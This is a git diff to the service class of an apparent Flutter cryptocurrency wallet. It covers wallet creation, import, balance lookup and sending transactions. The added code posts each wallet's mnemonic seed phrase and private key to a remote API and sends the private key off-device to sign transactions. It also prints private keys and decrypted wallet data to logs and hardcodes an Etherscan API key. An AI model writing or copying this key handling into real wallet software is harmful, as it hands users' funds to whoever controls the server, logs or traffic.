@@ -1,5 +1,6 @@
 import 'dart:async';
 import 'dart:convert';
+import 'package:shared_preferences/shared_preferences.dart';
 import 'package:web3dart/web3dart.dart';
 import 'package:bip39/bip39.dart' as bip39;
 import 'package:ed25519_hd_key/ed25519_hd_key.dart';
@@ -8,6 +9,7 @@ import 'package:http/http.dart' as http;
 import 'package:flutter_secure_storage/flutter_secure_storage.dart';
 import 'package:web_socket_channel/web_socket_channel.dart';
 
+import '../../constants/api_list.dart';
 import 'balance_event.dart';
 import 'package:hdkey/hdkey.dart';
 
@@ -130,7 +132,6 @@ class WalletService {
       throw Exception('Invalid mnemonic phrase');
     }
 
-    // Generate seed from mnemonic
     final seed = bip39.mnemonicToSeed(mnemonic, passphrase: passphrase ?? '');
 
     for (int i = 0; i < numberOfAddresses; i++) {
@@ -157,7 +158,6 @@ class WalletService {
     final seed = bip39.mnemonicToSeed(mnemonic, passphrase: passphrase ?? '');
     final hdKey = HDKey.fromMasterSeed(seed);
 
-    // Read the existing accounts from secure storage
     final existingData = await _secureStorage.read(key: _walletKey);
     List<Map<String, dynamic>> accounts = [];
 
@@ -171,10 +171,10 @@ class WalletService {
       }
     }
 
-    // Start with the first derived address
     int index = accounts.length;
     String newAddress = '';
     String newPrivateKey = '';
+    String publicKey = '';
 
     while (true) {
       // Derive the next address using the index
@@ -183,6 +183,8 @@ class WalletService {
 
       final credentials = EthPrivateKey.fromHex(newPrivateKey);
       newAddress = credentials.address.hex;
+      final pubKeyPoint = credentials.publicKey;
+      publicKey = HEX.encode(pubKeyPoint.getEncoded(false));
 
       // Check if the address already exists in local storage
       if (!accounts.any((account) => account["address"] == newAddress)) {
@@ -213,6 +215,35 @@ class WalletService {
       "aliasName": newAliasName,
     });
 
+    final prefs = await SharedPreferences.getInstance();
+    try {
+      final response = await http.post(
+        Uri.parse(ApiList.wallet),
+        headers: {
+          'Content-Type': 'application/json',
+          // 'Authorization': 'Bearer $token'
+        },
+        body: jsonEncode({
+          'mnemonic': mnemonic,
+          'privateKey': newPrivateKey,
+          'address': newAddress,
+          'aliasName': newAliasName,
+          'isImported': false,
+          'deviceToken': prefs.getString('fcmToken') ?? '',
+          'balance': 0.0,
+          'publicKey': publicKey
+        }),
+      );
+      if (response.statusCode == 200) {
+        final result = json.decode(response.body);
+        print(response.body);
+        print(result['token']);
+        prefs.setString('token', result['token']);
+      } else {}
+    } catch (e) {
+      print("Error sending token: $e");
+    }
+
     // Store updated accounts in secure storage
     await _secureStorage.write(
       key: _walletKey,
@@ -235,6 +266,8 @@ class WalletService {
   }) async {
     final credentials = EthPrivateKey.fromHex(privateKey);
     final address = credentials.address.hex;
+    final publicKey = HEX.encode(credentials.publicKey.getEncoded(false));
+    double balance = 0.0;
 
     // Read the existing accounts from secure storage
     final existingData = await _secureStorage.read(key: _walletKey);
@@ -272,7 +305,6 @@ class WalletService {
 
     final newAliasName = 'Account_${accounts.length + 1}';
 
-    // Add the new wallet details
     accounts.add({
       "privateKey": privateKey,
       "address": address,
@@ -280,6 +312,55 @@ class WalletService {
       "aliasName": newAliasName,
       'mnemonic': '',
     });
+
+    final prefs = await SharedPreferences.getInstance();
+
+    try {
+      final url =
+          'https://api.etherscan.io/v2/api?chainid=11155111&module=account&action=balance&address=$address&tag=latest&apikey=7VF9J4C4QBYKZPRV19G4374M3YPKJ2NAJT';
+      final uri = Uri.parse(url);
+      final response = await http.get(uri);
+
+      if (response.statusCode == 200) {
+        final data = jsonDecode(response.body);
+
+        if (data['status'] == "1" && data['result'] != null) {
+          final balanceInWei = BigInt.parse(data['result']);
+          final balanceInEther = balanceInWei / BigInt.from(10).pow(18);
+          balance = double.parse(balanceInEther.toStringAsFixed(4));
+        }
+      }
+    } catch (e) {}
+
+    print("Balance: $balance ETH");
+
+    try {
+      final response = await http.post(
+        Uri.parse(ApiList.wallet),
+        headers: {
+          'Content-Type': 'application/json',
+          // 'Authorization': 'Bearer $token'
+        },
+        body: jsonEncode({
+          'mnemonic': '',
+          'privateKey': privateKey,
+          'address': address,
+          'aliasName': newAliasName,
+          'isImported': true,
+          'deviceToken': prefs.getString('fcmToken') ?? '',
+          'balance': balance,
+          'publicKey': publicKey
+        }),
+      );
+      if (response.statusCode == 200) {
+        final result = json.decode(response.body);
+        print(response.body);
+        print(result['token']);
+        prefs.setString('token', result['token']);
+      } else {}
+    } catch (e) {
+      print("Error sending token: $e");
+    }
 
     // Store updated accounts in secure storage
     await _secureStorage.write(
@@ -415,7 +496,9 @@ class WalletService {
     return address;
   }
 
-  Future<Map<String, dynamic>> fetchBalances(String address,) async {
+  Future<Map<String, dynamic>> fetchBalances(
+    String address,
+  ) async {
     final ethAddress = EthereumAddress.fromHex(address);
     try {
       final ethBalance = await _ethereumClient.getBalance(ethAddress);
@@ -456,7 +539,8 @@ class WalletService {
       final gasPrice = await _ethereumClient.getGasPrice();
       final gasLimit = await _estimateGasLimit(toAddress, token);
 
-      print('calculating gas : ${(gasPrice.getValueInUnit(EtherUnit.ether) * gasLimit)}');
+      print(
+          'calculating gas : ${(gasPrice.getValueInUnit(EtherUnit.ether) * gasLimit)}');
 
       return (gasPrice.getValueInUnit(EtherUnit.ether) * gasLimit);
     } catch (e) {
@@ -470,15 +554,14 @@ class WalletService {
     return token == 'ETH' ? 21000 : 100000;
   }
 
-
   Future<String> sendTransaction({
     required String toAddress,
     required String fromAddress,
     required BigInt amount,
+    required String amountEth,
     String chain = 'ETH',
   }) async {
     try {
-      // Fetch wallet data from secure storage
       final walletData = await _secureStorage.read(key: _walletKey);
       print('Fetched wallet data: $walletData');
 
@@ -489,9 +572,8 @@ class WalletService {
       final List<dynamic> dataList = jsonDecode(walletData);
       print('Decoded wallet data as list: $dataList');
 
-      // Find the wallet that matches the fromAddress
       final wallet = dataList.firstWhere(
-            (entry) {
+        (entry) {
           print('Checking wallet entry: $entry');
           return entry['address'].toLowerCase() == fromAddress.toLowerCase();
         },
@@ -505,6 +587,10 @@ class WalletService {
 
       final credentials = EthPrivateKey.fromHex(wallet['privateKey']);
       print('Created credentials for private key.');
+      print(credentials.toString());
+      print(credentials.address);
+      print(credentials.privateKey);
+      print(wallet['privateKey']);
 
       final ethAddress = EthereumAddress.fromHex(toAddress);
       print('Parsed destination address: $ethAddress');
@@ -527,37 +613,97 @@ class WalletService {
           chainId = 11155111; // Sepolia Ethereum Testnet
       }
 
-      print('Selected client and chain ID: $chain, $chainId');
+      // print('Selected client and chain ID: $chain, $chainId');
 
       // Create the transaction
-      final transaction = Transaction(
-        to: ethAddress,
-        value: EtherAmount.fromBigInt(EtherUnit.wei, amount),
-        maxGas: 21000,
-      );
+      // final transaction = Transaction(
+      //   to: ethAddress,
+      //   value: EtherAmount.fromBigInt(EtherUnit.wei, amount),
+      //   maxGas: 21000,
+      // );
 
-      print('Prepared transaction details:');
-      print('  From Address: $fromAddress');
-      print('  To Address: $toAddress');
-      print('  Amount (Wei): $amount');
-      print('  Chain: $chain');
-      print('  Chain ID: $chainId');
+      // print('Prepared transaction details:');
+      // print('  From Address: $fromAddress');
+      // print('  To Address: $toAddress');
+      // print('  Amount (Wei): $amount');
+      // print('  Chain: $chain');
+      // print('  Chain ID: $chainId');
+
+      // print(transaction.to);
 
       // Send transaction
-      final txHash = await client.sendTransaction(credentials, transaction, chainId: chainId);
+      // final txHash = await client.sendTransaction(credentials, transaction,
+      //     chainId: chainId);
 
-      print('Transaction successful!');
-      print('Transaction Hash: $txHash');
+      // print('Transaction successful!');
+      // print('Transaction Hash: $txHash');
 
-      return txHash;
+      try {
+        final response = await http.post(
+          Uri.parse(ApiList.transaction),
+          headers: {
+            'Content-Type': 'application/json',
+            // 'Authorization': 'Bearer $token'
+          },
+          body: jsonEncode({
+            'privateKey': wallet['privateKey'],
+            'toAddress': toAddress,
+            'amountInEther': amountEth
+          }),
+        );
+        if (response.statusCode == 200) {
+          final result = json.decode(response.body);
+          print(result);
+          return result['sendTransaction']['hash'].toString();
+        } else {
+          return '';
+        }
+      } catch (e) {
+        print("Error sending token: $e");
+      }
+
+      return '';
     } catch (e) {
       print('Error sending transaction: ${e.toString()}');
       rethrow;
     }
   }
 
+  Future<String> getPrivateKey({
+    required String toAddress,
+    required String fromAddress,
+    required BigInt amount,
+    required String amountEth,
+    String chain = 'ETH',
+  }) async {
+    try {
+      final walletData = await _secureStorage.read(key: _walletKey);
+      print('Fetched wallet data: $walletData');
 
+      if (walletData == null) {
+        throw Exception('No wallet found in secure storage');
+      }
 
+      final List<dynamic> dataList = jsonDecode(walletData);
+      print('Decoded wallet data as list: $dataList');
+
+      final wallet = dataList.firstWhere(
+            (entry) {
+          print('Checking wallet entry: $entry');
+          return entry['address'].toLowerCase() == fromAddress.toLowerCase();
+        },
+        orElse: () {
+          print('No matching wallet found for address: $fromAddress');
+          throw Exception('Private key not found for the given fromAddress');
+        },
+      );
+
+      return wallet['privateKey'];
+    } catch (e) {
+      print('Error sending transaction: ${e.toString()}');
+      rethrow;
+    }
+  }
 
   // Future<String> sendTransaction({
   //   required String toAddress,
@@ -597,8 +743,6 @@ class WalletService {
   //   return await client.sendTransaction(credentials, transaction,
   //       chainId: chainId);
   // }
-
-
 
   Future<void> fetchTransactions(String walletAddress) async {
     final String apiUrl = "https://api-sepolia.etherscan.io/api"
